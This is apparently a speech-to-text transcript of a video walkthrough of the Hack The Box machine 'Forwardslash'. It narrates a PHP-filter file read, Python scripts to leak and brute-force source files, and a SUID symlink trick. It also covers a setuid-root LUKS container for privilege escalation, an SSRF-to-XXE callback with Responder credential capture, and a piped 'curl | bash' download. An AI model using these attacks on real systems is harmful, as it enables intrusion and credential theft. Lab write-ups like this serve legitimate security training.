 what's going on youtube this is ipsec i'm doing forward slash from hack the box which you're getting a two for one special with this video because there's two different ways to do both the user and the root and both of those ways are unique but wait there's more when it comes to the unintended user that's using a php filter to extract source code and we're going to take our time to build a python script to help speed up that process so we can just type a file name and get the source code and we're not going to stop there we're going to take that python script that we made turn it into a library and create like a custom exploit lfi dirt buster thing and then a targeted word list so we can have a super good go buster go against the box that can just extract like the entire etsy directory or any etsy file we know of so with that being said let's just jump in i think you'll like this video as always we're gonna start off with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats pin the nmap directory and call it forward slash and then the ip address which is 10 10 10 183 this can take some time so i've already ran it looking at the results we have just two ports open the first one being ssh on port 22 and its banner tells us it's an ubuntu server we also have http on port 80 and its banner is also telling us ubuntu we have the hdb title script running and saying the title of the page is backslash gang so let's just go take a look over at the page going to 10 10 10 183 and it directs us to forward slash dot htb so what i'm going to do is edit my host file to add that domain and i forgot the vi so let's do 10 10 10 183 and forward slash dot htb save this so now when we go here we get directed to a page and it says get backslashed kid and then we get some type of message that says just various things we get a hint that says who even uses xml and auto ftp logins so i'm going to try to um take notes as i go i hit um alt f2 to bring this prompt up and i'm trying to open up cherry tree failing a little bit but we got it open uh control n forward slash ctrl shift n notes and then i'm going to put this line okay uh let's see nothing else really here so what i'm going to do is type like robots.txt to see if i can find out anything else i'm also going to search like index.html not found index.php and we get a page so we know this web server runs php runs php and we probably should go over and start go busting this so i'm going to do go buster dash u htp forward slash dot hdb and i'm also going to put this in dur mode dash w for list user share word list dirtbuster directory list23 medium.txt and dash o we will call this forward slash dot htb dot out uh may want to do dash x php as well so we're running this we can also do a second go buster with pretty much all the same flags but do it on the ip address well actually we don't have to if um the just the ip address was like an apache welcome page i'd probably run it there as well because it shows two different like web server hosting but because 1010 1080 183 redirects everything to this domain i'm not going to worry about that we could do a sub-domain brute force so let's see if i get right this time the last time in the i think player 2 video i screwed up the this command like hilariously i just put the wrong um url so looking at the v host flags we can do w4 list and do an opt set list um what is it discovery dns and we'll do subdomains top million i guess there's probably a lot of these we can do uh the other flag we want let's see dash u url http and then we want to do forward slash dot hdb unable to connect uh i didn't do dash u okay it started so we'll call this vhost forward slash dot hdb and it found one already backup backup.forwardslash.htb looking at the pages it's only found index.php here so let's go and add to our host file so sudo vi etsy hosts and we can do backup dot forward slash dot hdb and then we can go there with backup.ford slash.hdb and we get a login prompt so we could try like admin admin or oh no account found with that username so administrator password so this lets us potentially uh find valid accounts which most web applications should not do so that's definitely a finding so maybe we can create findings maybe this will be helpful um username enumeration and then generally as i'm going if i want to take notes i will just take a screenshot um what is it is it shift print screen yes it is so select an area to grab what shift print screen select area to grab take screenshot there we go and then copy the clipboard and paste it and if you wanted to be clean you could just not do the highlight during that but taking screenshots as you go is definitely a very nice thing so we don't know any valid accounts we could try like creating a script and enumerating but it says don't have account sign up now so let's just create an account um i'm going to create the account ipsec with the password of please subscribe and then i'm going to put a bad password and we'll also take a screenshot of this go here capture the clipboard paste and there we go um if you wanted to be super organized you could do separate findings per thing come on paste paste there we go so the other one was backup dot forward slash dot hdb and the main finding is main website is owned and if you want to you could take a screenshot and put that one there but let's try logging in so please subscribe was the password we put and we get a page we have a few options reset password sign out change username change profile picture quick message and hall of fame so let's just take a look at each of these i'm not going to click sign ivy account because well that may just kill our cookie and we may never be able to access the application so reset password if we wanted to we could change it one of the things this isn't doing is asking us for a current password so reset pw does not ask for current which means anyone that does like a session hijacking attack if they can just if i left my account logged in somewhere someone go to this page and change my password not ideal uh username we could try putting like sql injection in the username so uh ipsec single quote and see what that does click submit i don't know what this is going to do actually let's do it in a new private window uh backup forward slash whoops backup.forwardslash.htb ipsec please subscribe it just did not change my password uh change my username so don't know exactly what that does but it's not really giving us any output we could go through burp suite and examine what it says so make sure my proxy is set to on test test send it to repeater send this and we don't really get any output so i'm not too concerned about trying to exploit this yet i always like seeing something where i give the page something and i get something back in return uh we get url and it says this page has been disabled while we get back on our feet after the hack and i can't click out of these buttons but they exist so i'm going to press f12 and it's not the maybe i should click inspector after this um intercept on do inspector that's what i wanted and i'm going to click this pick an element thing on the left click the url bar to examine the code and i see disabled and if i undo this disabled i can now type in this url field so we can see what this does so i'm going to put http 1010 because that is my ip address if i do it if config tun zero we get that so i'm going to do sudo nclvnp80 and then click submit and i can't click submit so let's look at this source and we also see it is disabled so undo that and then click submit and we have a get request we can paste something and then it just returns us to the page and things are disabled again so let us go into http history because i didn't have intercept on but we can just go back to the exact request send it to repeater and then send it to see exactly what it does okay send cancel out go back we want to go back to put and just says this has been disabled while we try to get back on our feet after the hack and then we don't have anything i'm going to actually host a web page so it behaves as i'd expect or we could before we do that um we could try the url right now is http colon slash slash there's a lot of different protocols we could do like most browsers if you do file colon slash it'll look at local files so i'm just going to see if i can pull the file etsy pass wd looking at this and we do see the file comes back so right now i don't know if this php script is doing a um like i forget the two things i think get file contents is php for reading a file and not allowing execution and if it did like an include around it then we could get code execution so let's just see if we can find that out quickly i'm gonna make the dub dub dub and we're gonna do um please sub dot php and we'll just do echo hello and then php to make sure this works does this have to be php like this there we go so if we see the actual tags we know it's not doing code execution if it just says hello we know we have code execution so i'm going to do sudo python dash m http server port 80. wait what why isn't my http server oh probably have to do python 3. there we go so now if i go back and we do this http and do did i capitalize it i did please sub dot php we can see it's probably doing a get file contents within php because it's not doing code execution and we can see we do have this um there are php wrappers and i've gone through this in many videos i bet if i just do like ipsec dot rocks we can turn burp suite off and then type like php wrapper plenty of things of me explaining it so we can do php colon slash filter convert dot base64 in code resource equals this is profile picture dot php and then we get a bunch of base64 echo dash n base64-d and we can get the source code of this page the reason why we use this php rapid to do base64 encoding is because whenever the php server sees this tag well actually do we even have to do that because it's a get file contents uh permission denied not that way so if we just tried with this i guess there's something that prevents us um we could try like dot slash so we should examine the web server to see exactly why this air meshes pops up to see if we can just bypass that let's see logged in page header i don't see permission denied so what i'm going to do is save this to a file profile pic.php denied no let's see and he includes so i'm not exactly sure where that error message pops up it may be like a mod security plug-in or something on the web server maybe if i remember we'll look at the uh that piece after we root the box but at this point once i get code execution or not code execution once i can include files [Music] i'm probably going to create a python script because often when i do i find myself not scripting this piece out and having to copy and paste everything i just get lazy and don't properly enumerate everything so let's go and create a script so we'll go into uh lfi or let's make the directory lfi and then we'll create a python script um source leak.pi so very first thing we need to do we need to be able to make http request so let's just split the pane and kind of say what we want to do the notes make http requests uh we'll also want to have some type of terminal prompt so this is going to be the request library and that's going to be cmd um oh god oh let's see we may want to save files and view source i guess i don't know uh that should be like that so let's see um in order to do the prompt we need from cmd import cmd and let's code the prompt real quick so class terminal and then cmd and then prompt is equal to please sub that's just going to be the prompt to the terminal i'll run it without this so you can see what that command does uh def default self line and then echo uh it's python print line okay and if name is equal to main this will be terminal dot cmd loop so let's just make sure we have this right python 3 source leak i don't have that let's see cmd loop missing one on self let's see class terminal cmd prompt default self line oh this no maybe it doesn't like that name class t terminal could be some like python thing cmd loop missing one positional requirement oh yeah let's put this back as terminal there we go so anything we type gets i'll put it back we can change please subscribe and there we go so terminal prompt is done so the next thing we need to do is make http requests so what i'm going to do is create some variables up top and whenever i like using a variable as kind of like a global context i always put in all caps and then if it's within a function i use lowercase so http backup.forwardslash.hcb profile.php and then von arg is going to be url and i'm pulling that from here okay uh let's see so we now need another function def get source file name and then lfi is equal to php filter convert dot base64 dash encode resource equals file name like that and if we wanted to we could return lfi and then print get source uh etsy passwd or don't have to hardcode it we can just do get source line von erg forgot the equal sign test etsy pass wd so we can see we should be doing that piece correctly so now we have to actually get the file so data is equal to von erg lfi this is going to be the post parameter so we can now do try request is equal to request.post url data equals data and then i guess we can just return request and then accept return false so if the command succeeds it'll return the request if it doesn't then it returns false etsy passwd 404 let's see uh it's not profile i think it's profile picture profile picture dot php etsy passwd response 200 so now we just have to do dot text return data dot text etsy pass wd and we don't have it this is oh this is the login prompt so uh we get here because we have an actual cookie to this page so if i go over to storage we see phpsessid and then we can copy this and add this v source leak cookie is equal to php session id like that and then this will probably be an exercise for you uh implement logic to log into page and grab cookie and you can use the um request dot session is probably where you'd want to start googling to do this and now we have to go down here and do cookies is equal to cookie let's see passwd there we go so now we just have to grab the base64 we could do like regular expressions and grab everything after this html but we just want to grab the very last line so how i'm going to do this is we're going to say request is equal to this dot what is it um python split by line break split line return request etsy passwd did not like that split line to split lines etsy passwd yes split lines i did not misread that oh well got it right so it's working and you can see it's in list there's commas between every line we just want to grab the very last one so i'm going to do negative one and now when we run this we just get that so need to find a way to base64 decode it so from base64 import b64 decode and we should be able to do b64 decode request at c passwd awesome now the downside is right now it's in byte format so we can just pipe it to decode and then we won't have to worry about that so return that dot decode etsy passwd and now we can easily get a bunch of files so like index.php profile picture.php like this makes it so much easier to grab the source took a little bit longer but um it's definitely worthwhile there's an api.php but there's one more thing i want to do and i want to save the files so we got the view source down we got make http request and now i want to save everything because nothing's worse than going through something and like what was that and having to do the exploit again or maybe the web server is down and you just don't have it so you should always have some type of way to save things so i'm going to create another function called uh save file and we're going to pass it two lines the file name and the source code and i'm going to use the path lib module so from path lib import path and we need to know the directory and we also need to know the file name and this path is going to have them both which i don't want so um instead of file name i'm going to say this is going to be full name and full name means path plus file name so their name is equal to path uh full name dot parent and then we'll do file name is equal to path full name dot name we should be able to print enter name and print file name so let's do source is equal to get source and then save file and we're doing line source etsy passwd so we have this correct we printed it slash etsy and passwd so now we have to create the directories and save it so we'll do save path is equal to our current directory and i'm going to use os for this so import os os dot get current working directory plus slash plus der name print save path and the reason why i'm doing this is because if there's like two index.php files if i write them both into my current working directory one will collab with the other so i always want to take and count what directories there are so let's see passwd uh can't concatenate string uh maybe if i do str here maybe this works awesome so this is where we'll be saving passwd to uh these two slashes shouldn't matter that maybe should do a fix but we'll see if it doesn't so plus save name let's do that should be fine so the reason why i didn't want to use full name there which i was just thinking why didn't i do that is because i need to make the directories so now we can do try os dot makers and save path accept none so now if it will try to create all the directories and all we have to do now is write the file so f is equal to open this is save path plus slash file name uh yeah we need save path if i just used full name there it's not going to do a current working directory okay now f dot write source f dot close that's the passwd no such follow directory okay we have to put the mode w plus that needs to be in quotes etsy password now i created the directory etsy and passwd is here so that is good news so source and then we can do print source python 3 source leak so now if i did index.php or let's do etsy lsb dash release and let's get out of this program we can go into etsy and we can see it save that and we also see it saved index.php here so before i go and poke even further we're going to add a thing and say script it so right now the lfi is all manual but let's go and create a new thing called brute dot pi i'm going to do from source leak import star and this will give me the ability to use any function in that program so etsy pass wd python 3 we just want to do brute source leak no module name get source from source leak import star no module named source oh dash there we go that should work uh let's just do we'll call it leak.pi or lfi.pi brute from lfi import star there we go so if we do print that's good um the reason why i'm doing this is because now we can create a script to like uh brute force a bunch of things so find slash etsy and this is going to take every etsy file on my box so i'm going to actually use sudo in case i don't have permissions to read some file names to files so if i cat files now have a list of my etsy directory so we can go to brute dot pi and say um for line in open files print line now run this again python3 root.pi probably need to add a dot strip line equals line.strip there we go so we can say source is equal to get source etsy pass wd and need to terminate that quote and if source because i think git source is exiting on a false if it doesn't download anything then save file file name and the source okay python3 brute dot pi files not defined this is line let's see f open save path is a directory v files let's just get rid of that um we could wrap a try around this source to get ignore that what happened there was slash etsy existed in my uh file list and it was trying to open slash etsy as a file and it's already a directory so it couldn't but now we run this brute force script and oh my god f open not a directory oh this is one of my more embarrassing bugs i had hardcoded this to kind of explain what was happening we can just put line here that may be better there we go it runs so if we go into etsy or lfi etsy we can see in creating files as it finds them so now while we go and manually poke at the server we have something that's automatically poking out the server making us much more efficient so let's go take a look at the source code so let's go into lfi python3 lfi.pi and take a look at all the source codes so profile picture.php and let's see what do we have nothing too interesting there is a login.php so let's take a look at that login.php and see what we have here a config.php and we have potential username and password so www data and this so let's go cherry tree sub node grads dub dub dub data and paste it so etsy passwd look at users we got chive pain and that may be it by cat etsy pass wd grep bash so we have root paint and shiv so let's do bi passwords copy this paste uh echo dash n i just want to count the characters of this uh wc-c 99 if it was like 32 40 or some type of character that stands out to me as hashing like 32 would be md5 40 would be shot one sum uh i tried cracking it or something but this looks like it's just a straight password so we can do crack map exec ssh root or dash u root dash p passwords and with specify 10 10 10 183 see if this works and i would create a users.txt but right now crack map exec has a bug that doesn't let me use a file name in this way so that's why i'm just doing each one manually so that password didn't get us anything uh if we go back to go buster don't really have too much there should be something that just hasn't hit yet um girl forward slash dot eight oh there's one thing we're missing actually um hasn't it yet but we should have ran a second go buster on backup.foidslash.htb and because i just ran this because i guess i pasted it and probably oh no i don't have a t here so i didn't what okay yeah i didn't collaborate i thought i collaborated the output file so i was just going to kill the previous one uh output file backup dot forward slash dot htb and run this go buster this one should get a hit on dev if i curl there we go i've done this box before so i knew that so we should go and look at dev's source so let's go back to the python script dev slash index.php and we could try hitting it as well so if we did backup dev index.php we just get access denied so we can look at this source we see a weird function here and when i go show the intended route i'll go explore what this is but going all the way up we should have credentials xml api test it's pulling stuff from login.php here we go ftp login user id chiv nobody likes backslash so sshif at 10 10 10 183 let's try this cred and we get in so let's take notes jiv nobody likes backslash web server runs php lfin profile picture.php code leak and credential in dev index.php so with the shell the very first thing i always like to do is run some type of enumeration script against it i normally use lin p's so opt privilege escalation awesome script suite len p's linps.sh copy it here and sudo python3 dash m hdb server curl 10 10 14 2 8000 linps.sh type it to bash and let this run and it was just doing a set uid thing i'm going to pause it real quick we can look yeah set uids and i saw something interesting scroll past the screen and that is user bin backup this is not a normal binary so i'm going to take a look at this while lynn p runs let's just create a new ssh session shiv at 10 10 10 183 and we can copy the password paste it in is it gonna glowed there we go and which back up so user bin backup if i just execute this we get panes next gen time based backup viewer and it says the current time is this and then gives a weird hash and does not exist or is not accessible exiting so first thing i do is um is it s trace yeah syscall trace s trace on backup to kind of get an idea what it does i'm hoping it just executes like the command date and we do some type of path injection like um if i do date we could just test for it but v date then bash echo pound so if i ch mod plus x date if i execute date it says pound if i do date it doesn't say that yet but if i look at my path i see my current directories not in there so if i did export path is equal to my current directory colon path so now i echo path i see home chip is here and now i run the backup command or not backup i run the date command and it's taking the date from my path so quick way of appearing a lot of binaries but we don't see that happening so s trace backup looks like it's doing etsy local time echo date so i don't see it doing a system call on anything so it looks like it probably gets the date through just uh c and not executing system we see it doing a set uid 1002 this is probably going to be payne's id or maybe 1000 not sure exactly what's going on there um it's trying to access the file so i think at this point it may be good just to download the file and analyze it because we don't really see any thing that's standing out just looking at syscalls it makes not too interesting so let's do is that the password now copy it scp chive at 10 10 10 183 user bin backup to my local directory paste the password opt ghidra it's engaging run there we go then file new project this will be hdb um forward slash and let's just make this directory and we'll call this backup open the decompiler i for import go up to directories forward slash backup and then we're going to select all options when it asks us yes all analyze and let's wait for this thing to finish it has got a functions there's a main look at this see what this does so just a bunch of defining right now it's doing a printf and then um the dates so the very first one's going to be hours so local 40 this is probably going to be our i just hit l to rename you can see it pulled the hour right there next one local 48 this is probably going to be minute but it uses this twice so i'll do time so that's just skipping over the minutes or just grabbing the hours right there um let's see what else is it doing it's doing a string to md5 so it's just taking an md5 of this format so hour min seconds then printing time setting the uid if it can't access local 58 this is going to be md5 time uh it says does not exist else it's going to open the file and if it can read the file name so this is going to be the file descriptor probably if it can't open it it says it can't else it looks like it will print it so if the chive user can read a file it prints it essentially so let's go look on this box and do find slash i think dash maybe user chiv to devnall and we also probably want to do dash ls to see permissions and that's going to show everything that chiv owns on this box so grab v we don't need to see things in slash proc so let's ignore that um actually which backup lsla user bin backup that's pain so that find command except we want to look at pain and the very first thing we can see is this verb backups config.php we also have his home directory and looks like we can actually read the python scripts so we probably should have went into his directory and looked at like note.text but um we can read verbacupsconfig.php.back cat this oh we can't read that but this is by the one we want to have backup read so running the backup command it tells us the current time if we run this twice since it's a second the command executes twice in one second easily so we can see this matches twice so what i'm going to do is say i is equal to back up grab the very last line with tail and then the hash is the second word so i'm gonna do awk print two and we'll do echo i and c it's the hash so now we can do a symbolic link with ln s to say um the file ver backups was it config php.back is equal to this so what that's going to do is create essentially a shortcut with this as the file name and whenever someone tries to access this it's going to point them over to this backup file and we'll run back up again and we can see we get the file so pane and then a another password so go over to cherry tree creds pain and we can try su pain and we get in so at this point we can read use it our text note etc again encryptinator looks like some type of crypto challenge but looking at sudo we can see we're able to execute the command setup locks open and mount if you had actually read the note.text clearly you would see they've encrypted stuff and put some type of crypto magickey on it so that's why we can do locks open because they've created a encrypted lux volume and put some secrets in that and then this little python script um protects that and that intended way is to break the scripture which we will do in just a bit however i hadn't done that that way i looked at this crypt setup lux open and decided to drop a lux container on this box with a set uid so let's do that let's do create lux container maybe let's see this looks good so the very first thing we do we have to create a block device so let's go back to our box and we can delete this and run this command actually i always hate running dd commands copy and paste because i've wiped stuff out before that way so ddif for input file we'll call this um please sub dot img or we could call it dot lux doesn't really matter what we call it uh actually input file is dev rent zero output file is please sub dot lux and then block size they have equal to 1m count we'll do we'll do a 20 meg file yeah that should work so if i cat please sub dot lux it's just 20 megs of nothing uh d u dash h s you can see that but there's nothing in it if we xxd yet um it's all zeros so that just created blank space on our hard drive so the next step uh step to do is um this crypt setup so this is going to create the lux container so copy oh let's make the lux move into locks there we go so lux format please subscribe lux type yes and capital letters i'm just going to put pw for the passphrase and let it create this container and now we do a lux open on this so we called it please sub dot lux and then this is going to be the device name the next thing so we'll call this uh like if i can type like this video and the passphrase so what that command did is now we have ls dev mapper like this video which is just a block device so we create a ext4 uh for partition on this so sudo mkfs.ext4 right mkfs.ext4 and devmapper like this video so this is going to create a file system and now we should just be able to mount it so sudo mount devmapper into mnt and if we look at mnt it's just a file system so i'm going to cheat a little bit and copy a set uid c program here we'll take a look at what it does real quick super simple just including some libraries then set uid 0 for root set gid 0 for root and system and execute a command so sudo gcc set uid dash o we'll call it set uid and now sudo chmod 4755 this is going to add the set uid bit on the program so now if i do dot slash i do who am i or ipsec dot slash set uid who am i we are root so now we have to close this so sudo unmount and then crypt setup lux close so sudo well let's go to the previous directory we're in sudo uml mount and then lux close uh like this video so this please subscribe lux is now just an encrypted lux container that has that program on it so let's copy the file to pain at 10 10 10 183 we'll just put it in dev shm grab his password paste it and now it's copying that 20 meg file it's there so if we go dev shm what okay did not save it it looks like let's just copy it to his home directory so we should have the file there so we can do spin setup lux open please subscribe dot lux and we'll call it like this video uh we have to do sudo now it's mounting that lux thing oh we actually have to use um backup because devmap or backup so sudo lux close oh we can't close huh okay but i think you can mount it multiple times so mount back up and we can do sudo bin mount dev mapper backup and go into my slash directory because the mount command specifies dot slash mount which will mount it here sudo cd mount and we have our set uid program we run it we are root so let's just do set uid bash and we have now successfully privest on this box so let's go and do the root the intended way i was thinking do we do the use as the intended way the root versus the intended way let's just do the root so uh sudo dash l let's do sudo we just copy it paste so we are now paying and we want to break that crypto so let's go into home pain encryptinator and look at this it does examples right here but what i'm going to do is copy everything into dev shm and we'll work out of database databases yeah we'll work out of dev shm looking at the actual source code at how it encrypts we see it grabbing key and grabbing message and now it's going to loop through every character in the key and for each character and the key it's going to loop through the entire message and then if it's the very first character it's going to grab the last character of message and otherwise it's going to grab the previous so this is kind of like a cipher block chaining where the previous thing and encrypted influences the next thing and it's going to take the number of the message take the number of the key and add it so essentially uh let's see we can close that pane say we have the message we'll just say the message message and key is the key so it's going to loop through key and the first loop it's going to take key okay and it's going to do this m gets converted to whatever the care of m is so we can print ord m uh space so it's going to do 77 plus the first load of the key which is 75 and then plus the very last letter of the message because i is equal to 0 here so this is going to be e 69 so it's going to do all that and then the next character e is kind of go through the same exact thing of uh plus 75 plus whatever this equals um 77 plus 75 plus 69 plus 2 to 1 because that is going to be the current place minus 1. so you can go through all that gonna do message and then m is equal to the same exact thing whatever the current value is plus uh e because the second letter to the key would be e in this case so 69 plus so it's hopefully that made sense how i went through it um it's a pretty simple thing i'm sure if you look at it enough you'll understand it but essentially what i'm going to do is let's just try to create a brute forcer so that's why i copied everything here so let's just go to encrypter delete these two lines because we don't really care about them and we're going to create cipher is equal to encrypt and we'll just say sub for subscribe and then it'll be what can you do to help me out and if we print cipher and just run this you can see it encrypts content awesome so now we want to create a brute forcer so four key length in range zero to we'll say 8 print key length i just want to make sure i did this correctly okay let's do one to nine that's why i always like running things that i'm not 100 familiar on so that range did zero to seven when i expected it to do one through eight so kind of just helps fix the bugs the next thing we want to do is create a list of all possible permutations for this key length so let's do um import editor tools and import string so itter tools is going to be able to produce all the possible commutations or permutations or whatever and string is just going to be able to give us strings for i and editor tools.product string dot ascii lowercase and we'll repeat it for the length if we print i you should get an idea of what it's doing and i should get an idea if i made a typo or not so now it's just doing all possible permutations for all the keys so we have to join this so if i do join i like this now it's joined if i put anything here let's say i put a colon it's going to join that um dictionary or whatever value error tools gave me with colons so that's what that double quote meant so this will be guess is equal to this and then decrypted is equal to decrypt guess e and since we know this plain text we can do some guesses so we can say if help or in decrypted or out and decrypted print guess so this is just saying if we have potential hits print the key we used and when we do it against the cipher text we're probably going to do things like um the word password uh e is not defined oh this is decrypt guess cipher and we had to print a bunch of things and this is something i can't actually understand how this crypto is failing um the first character and the key length is the only thing that matters so anything that begins with s will be able to decrypt a good chunk of the cipher so let's show this um cp encrypter to e.pi i guess cipher and we'll say print decrypt sub actually let's do message is equal to what can you do to help me out so decrypt sub message so let's just make sure this works python3 e dot pi does not uh oh this is cipher so it was saying anything that began with s and was three characters so we'll do uh three s's three or two t's p and h and you can see it's only messing up the second to fourth character and decrypting everything else i have no idea why this is happening um i looked at it for a long time if it's an extra character it won't do decrypt anything and the weird thing is the first character and what comes after it this is the length of the key so um if we do subscribe message and we'll do a capital s and then how many characters is subscribe i think eight one two three four five six seven eight nine oh man it screwed my pain up that's funny but if we look at this v e dot pi paste let's see it had a few characters it can't print so we just do that um so it's weird i'm guessing that is a side effect of um this i equals zero thing i'm actually not sure what if i just take this out and break so if i equal zero do nothing what's gonna happen here still decrypts so it just messes up the first character i believe so it's a weird thing about how they screwed up this crypto don't actually understand it but at least we can kind of reproduce it so in order to decrypt this ciphertext all we need to do is um guess the length of the key in the first character so cpncrypto.pi to be we'll call this solve.pi i guess and then we'll say keylength is in range 1 through 32 and you could have also used like rocky.txt and just got lucky because as long as the very first character hits you can decrypt it so um we don't need to use iter tools anymore so we can say for i and let's just do string ascii lowercase print i python3 solve okay so this will be i times key length there we go so if you look at the beginning of this file whoops less you can see it's just going to brute force the entire lowercase string with that so at first it does the same character once then does the same character twice then three times and whatnot so we can now instead of saying print we can say guess is equal to this and then decrypt is equal to decrypt we don't want to overwrite that name um decrypted i'll just call it d d is equal to decrypt guess and the message we'll call it the cipher and then say if password we'll say pass and cipher print guess so now all we have to do is get the cipher so f equals um open cipher because i think that's what the program uh the ciphertext is ciphertext so f is open ciphertext dot read it's not going to do it print f let's see what that does python 3 solve i can't decode the byte let's do that cipher is equal to f dot read screwing something up let's look at the python command for open python open man built in functions open let's see file mode ah probably encoding uh let's run this again invalid character so 0xcb is not a valid utf-8 character my favorite encoding lately to use in python 3 whenever i get those type of things is latin you could do like unicode or something but i just find latin to be the best and the error message went away but we don't actually get any output so we probably should do multiple words so let's see try to think of a good way to do a list and this if i'm just going to say words is equal to we'll say is the be a like that it's hard to build sentences without these words so at there we go if one of python has it contains python contains contains another string football and i'm just going to do it the lazy way um for word and words if word and cipher there we go we may get multiple hits uh print guess maybe break so that did not do it oh not cypher nd for decrypted contents so if we decrypt with c we get some words so let's see what happens with that um i'm just curious now cpe uh let's do cp solve dot pi to s dot pi uh you horrible with file names right now so d is equal to c like that print d so python 3 s dot pi and i'm going to pipe to xxd and where did we hit uh tail dash 10 solve probably like a two letter word uh maybe like be oh we hit somewhere i don't know i is oh crap dash i is the b i don't think it would trigger in hex a t ah equals j-w-a-t so that's where it hit um so what we can do to our script is actually put spaces so that should make it less likely to hit that condition so with a few v's few eyes few r's a few t's and a bunch of y's so let's try these v's i don't know what key i just hit v i s dot pi python3 s dot pi omg so that one didn't work i can try eyes still not getting text these t's happen twice that's weird i don't know why that would happen twice and we actually get a bunch of text so the first 17 characters is garbage because again um we don't actually have the exact key we could try brute forcing the exact key to get the very first few characters but i'm not going to worry about that uh encryption tool pretty secure huh anyways here is the key to the encrypted image from verb backup recovery and then it has this key so we can say file ver backups recovery encryptedbackup.image so here's the key do i still have the lux open command sweet i do so lux open verb backups recovery encrypted backup to backup paste the key and the device backup already exists so i'd probably have to reboot the box or something to get rid of that because i can't actually lux close this let's see mount we'll do mount sudo as it bend mount dev mapper backup make turn mount cd mount cmd set uid bash pass wd please sub exit sudo i'll go up one directory sudo uml mount su please sub uh crypt setup lux close back up there we go so from the unintended solution we mounted something else and had to do all those steps to close it so now with this lux open command we should be able to uh grab it here's the key make sure we get the whole key paste it's mounting mounted go back to do a pseudo mount command go into mount and it's an idrsa file with the root key so now v id rsa paste chmod 600 sh i i d rsa root at 10 10 10 183 and we get in as root so that is the intended private breaking the crypto so we should go all the way back to uh vera dub dub dub and this when we found the dev directory and then this index.php thing contained uh some weird stuff some xxe stuff and if you look at our very big or notes at the very beginning whoever uses xml and automatic ftp logins so this is a hint at doing xml entity injections so let's see let's just clean up our sessions and do this so exit everything man i created a mess okay so now let's go explore the intended way to get a user shell and this doesn't use that php filter to do base64 magic at all so it goes all the way back to the uh welcome not welcome page the uh not quick message it's service side request forgery on this change your profile picture page so if we enable this so we can write to it instead of disabled we can write do it here too so we can submit here it is okay let's go to burp and make sure burp is set to intercept make sure a browser is on it and we can say let's go to our self so nclvmp80 sudo submit go to burp suite send to repeater go and we get the request so we can make the server actually make http requests and if we put it on itself backup dot forward slash dot htb and i don't think this has to be url encoded so do that for ease of read we can see it will pull a page and output the page so if there's no url it ends at this html on 32 then if there is it's making that request and then printing the output so if you went back into your dirtbust and looked at backupforwardslash.hdb you see this slash dev and if you access slash dev uh we can turn brick suite off access slash dev we see access denied from 10 10 14 2. so it's saying an ip address means it probably doesn't like the network we're on so if we made a request with um from this server since this server is initiating the request it's now going to be local host is making the request and we can see xml api this is our api test for when the new website gets refurbished so by doing this server side request forgery we can trick the server in thinking we're a local host and access this page that should only be accessible internally so we see it's doing a post request on dev index.h dot php and it's xml xml test so the argument name is going to be xml and then it's sending api and request so if we go back all the way to just forward slash dot htb it talks about who even uses xml and automatic ftp logins well there's xml any injections which then could potentially make this page make a request so let's go to payload all the things github and pull up a payload of xml nd injection so let's see i think it's xxe there we go and we can just do like a classic xxe so let's see if we can get this working paste this in let's see uh instead of doing file let's do one that does http let's see did i pass something classic blind so this one is going to make a request back to our server so let's use this one so we paste the xml we don't want to go to burp collaborator we just want to go to 10 10 14 2 and we want to make sure we are listening on port 80. so pseudo netcat lvnp 80. and if we send this of course it's not going to work because i mean this probably isn't even a valid payload we could try putting it all on one line but in burp you can just encode the line breaks so like uh i'll do right here so if you highlight right click convert url all characters you can see it converted the line break to zod 0a so i'm just going to convert this whole payload to be url included now we're going to send it and we don't get anything and that's because when you do these type of server side request forgeries you generally have to do a double url in code so i'm going to highlight the whole thing press u again or control u and it's going to double url encode what that means is this percent has now got url encoded to percent to five because that is the ural encoding of a percent and the reason why we have to do this is because um we're sending it invalid data like we can't have some characters within a url like or arguments like i'm typing a few bad ones and when we do the url code the first time it's working for a burp session so we sent this to the profile picture.php page and when it left or hit the server that one time it decoded it and now it's left with this and then makes this request in the parameter so when you double url encode it it's going to hit this profile.pxp decode it once still be decoded for when it does that second request so that is why we're doing a double url in code is because it's actually using this url twice so double url and code the request hangs here go back here and we get a connection so the next thing we have to do is make this do a ftp connection so i'm going to highlight the whole thing but i'm just going to hit control z to go back and i'm going to replace http with ftp and we're going to listen on port 21 which is ftp and we have to url encode it again so highlight the whole thing and it's probably this question mark that's a bad character or one of the bad characters so encode all characters boom did not like that i don't know i just hit ctrl ah there we go let's see do we need a slash screwed something up convert url all characters second there we go it's hanging so we get this connection back i think um the ftp generally sends i think it's a 220. and i think this is the syntax for a ftp service hello packet 220 i think is the hello connection then description of the ftp server then an ip address user chiv i forget the second one maybe is it 320 no so let's look up ftp ftp telnet example understanding withdraw this may be good so here we go the server sends this which is kind of like what we did or hello ah 330 ah that's more anonymous what if we send a 331 if it would be fine we're about to do it an easier way i was just showing off right now uh 220 okay 331 shiv okay and then we get the password so we continued on and did like a 230 access granted it's going to do type i and continue whatever it's doing so if we kept implementing an ftp we could potentially get a file they're trying to send but easy way to do this is just use responder so if i do sudo responder dash capital i ton zero we can see all these servers it has on and this means if someone tries to connect and send a password it's just going to accept and tell us so ftp is one of the things that the server is running so we just send the request gets to responder and we get the credential so that's the intended way to get the password um let's look into like why we couldn't just do url equals index.php with this permission denied thing so let's look at this um ssh-i idrsa root at 10 10 10 183 so cd ver dub dub dub grab dash capital r and i'm going to search for not that way okay so that's in api.php that's easier than i expected to find so let's see it's right here uh let's see picture explode so picture is going to be output and then this file gets contents thing and post url that's what we're sending if picture session start equals false i think what this is doing is saying if um session dot underscore start is within the page then say you can't do this so whenever we tried to include index.php session start is here so we can probably include any file that doesn't have that session start config so config doesn't have any instance of session it's not going to output anything because it's within these php tags so php is going to execute it but if we don't get permission denied not that way we can be confident that's how the server is behaving oh whoa oh because file get contents not include that's right so yeah we can get php code so we can grab the source of php if it doesn't include that session start and the reason why it's not hiding this is because the request is looking like let's go vim profile picture.php it's a file get contents right here if that was include then we wouldn't see it because it would be trying to execute code so because we're root we can try changing this to include uh this is bad code now come on there we go so include url and we don't have any code so but yeah i don't know what i was gonna say um let's see let's go into html nothing oh there's a note.txt cat html note.text oh less index.php okay so all this is doing index.php if server name is not forward slash dot http redirect so that's how that redirect worked so backup grab dash r system exact i'm just saying if there's any other like dangerous functions in this but it doesn't look like it is so when recording the intro i realized there was one other cool thing i could show you and that's going all the way back to the lfi script that we created that does some brute forcing of directories and we could improve this logic to make it um crawl pages and hunt for other php files to download so what i'm going to do is remove star.php and hope i don't remove anything important looks like it's fine i'm going to create crawl.pi and just like last time i'm going to do from 